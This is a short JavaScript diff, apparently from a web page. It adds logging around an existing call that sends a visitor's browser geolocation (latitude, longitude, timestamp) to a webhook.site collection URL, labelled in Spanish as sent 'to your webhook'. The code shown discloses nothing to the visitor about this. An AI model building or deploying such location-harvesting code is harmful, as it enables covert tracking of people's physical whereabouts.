@@ -43,13 +43,17 @@
                         // 🔄 Enviar ubicación a tu webhook
                         fetch("https://webhook.site/41f0c047-e8a5-401f-8459-f9671b2347ee", {
                             method: "POST",
-                            headers: { "Content-Type": "application/json" },
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
                             body: JSON.stringify({
                                 latitud: lat,
                                 longitud: lon,
                                 timestamp: new Date().toISOString()
                             })
-                        });
+                        })
+                        .then(res => console.log("Ubicación enviada:", lat, lon))
+                        .catch(err => console.error("Error al enviar:", err));
                     },
                     function(error) {
                         const mensajes = {
